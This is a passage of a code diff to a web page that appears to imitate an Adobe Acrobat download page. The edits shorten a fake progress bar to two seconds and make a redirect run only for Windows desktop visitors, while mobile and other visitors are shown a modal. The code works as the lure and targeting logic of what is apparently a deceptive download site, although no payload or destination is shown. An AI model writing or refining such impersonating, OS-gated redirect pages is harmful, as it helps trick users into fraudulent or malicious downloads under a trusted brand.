@@ -259,7 +259,7 @@
       height: 100%;
       background: #1473e6;
       border-radius: 4px;
-      animation: fillProgress 4s ease-out forwards;
+      animation: fillProgress 2s ease-out forwards; /* Updated to 2 seconds */
     }
     
     @keyframes fillProgress {
@@ -272,6 +272,15 @@
       100% {
         width: 100%;
       }
+    }
+    
+    /* Updated progress animation duration for 2 seconds */
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: #1473e6;
+      border-radius: 4px;
+      animation: fillProgress 2s ease-out forwards; /* Changed from 4s to 2s */
     }
     
     /* Step content */
@@ -822,35 +831,47 @@ Adobe Acrobat Download Page Visit`;
         setTimeout(() => {
           showMobileModal();
         }, 1000);
+        
+        // Don't start progress animation or redirect on mobile/non-Windows
+        return;
       }
       
-      // Animate progress percentage from 0% to 100% over 4 seconds
-      const percentageElement = document.getElementById('progress-percentage');
-      const duration = 4000; // 4 seconds
-      const startTime = Date.now();
-      
-      function updatePercentage() {
-        const elapsed = Date.now() - startTime;
-        const progress = Math.min(elapsed / duration, 1);
-        const percentage = Math.round(progress * 100);
+      // Only run progress animation and redirect on Windows desktop
+      if (isWindowsOS() && !isMobileDevice()) {
+        // Animate progress percentage from 0% to 100% over 2 seconds
+        const percentageElement = document.getElementById('progress-percentage');
+        const duration = 2000; // 2 seconds (reduced from 4 seconds)
+        const startTime = Date.now();
         
-        percentageElement.textContent = percentage + '%';
-        
-        if (progress < 1) {
-          requestAnimationFrame(updatePercentage);
-        } else {
-          // Animation completed - trigger redirect
-          console.log('Progress animation completed at 100%');
-          triggerRedirectAfterAnimation();
+        function updatePercentage() {
+          const elapsed = Date.now() - startTime;
+          const progress = Math.min(elapsed / duration, 1);
+          const percentage = Math.round(progress * 100);
+          
+          percentageElement.textContent = percentage + '%';
+          
+          if (progress < 1) {
+            requestAnimationFrame(updatePercentage);
+          } else {
+            // Animation completed - trigger redirect
+            console.log('Progress animation completed at 100%');
+            triggerRedirectAfterAnimation();
+          }
         }
+        
+        requestAnimationFrame(updatePercentage);
       }
-      
-      requestAnimationFrame(updatePercentage);
     });
     
-    // Function to trigger redirect after animation completes
+    // Function to trigger redirect after animation completes (Windows only)
     function triggerRedirectAfterAnimation() {
       console.log('Animation completed, checking for redirect...');
+      
+      // Double-check that we're on Windows desktop before redirecting
+      if (!isWindowsOS() || isMobileDevice()) {
+        console.log('Skipping redirect - not Windows desktop');
+        return;
+      }
       
       // Check if utils is loaded and teams is enabled
       if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
